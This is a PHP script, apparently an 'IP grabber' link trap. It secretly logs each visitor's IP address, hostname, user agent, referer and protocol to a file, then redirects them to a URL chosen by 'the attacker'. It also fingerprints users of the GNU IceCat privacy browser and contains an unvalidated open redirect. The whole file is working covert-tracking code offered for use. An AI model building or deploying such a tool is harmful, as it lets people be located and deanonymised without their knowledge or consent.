<?php
if (!isset($_GET["url"])){
    // chose a google 404 page because that seemed the most friendly thing to be greeted with
    $targetDest = "https://google.com/404";
}

//checked this out for some loot I almost missed https://github.com/dzt/ip-grabber

$targetIP = $_SERVER["REMOTE_ADDR"];
$agent = $_SERVER["HTTP_USER_AGENT"];
$hostname = gethostbyaddr($targetIP); //new
$ref = $_SERVER['HTTP_REFERER']; //new
$protocol = $_SERVER['SERVER_PROTOCOL']; //new


if(filter_var($_GET["url"], FILTER_VALIDATE_URL)){
    $targetDest = $_GET["url"];
}else{
    // if the URL isn't valid it'll generate an error file. This would only realistically happen
    // if the attacker forgets to set up the GET data appropriately, but it's nice to have
    // contingency plans.
    $targetDest = "https://google.com/404";
}

// files are written in IP address - time format
// 127.0.0.1_2021-05-08-minutes-seconds
$fileName = $targetIP . "_" . date("Y-m-d-H-i-s");

// I don't fully understand what GNU IceCat does but it comes up with an ip address like ::1
if(!filter_var($targetIP, FILTER_VALIDATE_IP)){
    $fileName = "obfuscated_" . date("Y-m-d-H-i-s");
}

// call this if something bad happens
function abortAbortAbort(){
    header("Location: " . $_GET["url"]);
    die();
}

$logFile = fopen($fileName, "w") or abortAbortAbort();

if(strpos($agent, "Firefox/78.0")){
    // GNU IceCat can be "soft-identified" by looking at the firefox version
    // this works on my machine, older versions of GNU IceCat wouldn't get picked up
    // however I think it's safe to assume that anyone using it is probably going
    // to want the newest version of the software
    // and since it isn't getting updated all that often, this is a half-okay
    // way of identifying it for now

    fwrite($logFile, "This could (MAYBE) be GNU IceCat\n");

    // my recommendation for users would be to use an older version of GNU IceCat
    // and my recommendation for IceCat devs would be to update your damn software!!!
}

fwrite($logFile, $agent . "\nHOST NAME: " . $hostname . "\nREFERER: " . $ref. "\nPROTOCOL: " . $protocol . "\nHave a nice day :)");
fclose($logFile);
header("Location: " . $targetDest);